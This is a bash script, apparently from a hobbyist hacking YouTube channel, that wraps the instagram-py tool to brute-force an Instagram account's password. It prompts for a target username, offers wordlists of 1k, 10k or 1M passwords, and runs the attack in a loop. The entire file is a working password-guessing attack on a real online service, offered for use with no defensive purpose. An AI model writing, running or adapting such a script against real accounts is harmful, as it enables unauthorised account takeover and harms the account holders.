#wordlist selection.
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo '
 ____  _  _  ___  ____   __    _   _    __    ___  _  _ 
(_  _)( \( )/ __)(_  _) /__\  ( )_( )  /__\  / __)( )/ )
 _)(_  )  ( \__ \  )(  /(__)\  ) _ (  /(__)\( (__  )  ( 
(____)(_)\_)(___/ (__)(__)(__)(_) (_)(__)(__)\___)(_)\_)
                [#] Auto Password Attack [#]
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Script By WASII << \e[0m\n"
printf "\n"
printf "       \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Hacker wasii \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
echo -e "$grn              [+]$red Type$ylo 1$red FOR 1k Passwords$grn
              [+]$red Type$ylo 2$red FOR 10K Passwords$grn
              [+]$red Type$ylo 3$red FOR 1M Passwords $rset"
echo
read -p "[#] Enter Selected Number: " marks
echo 
if [ $marks = 1 ]
then
    instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass1.txt 
 
elif [ $marks = 2 ]
then
    instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass2.txt
 
elif [ $marks = 3 ]
then
    instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass3.txt
else
echo
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"
echo
sleep 1.0
cd $HOME
fi
sleep 10.0
cd $HOME/instahack
bash instahack.sh
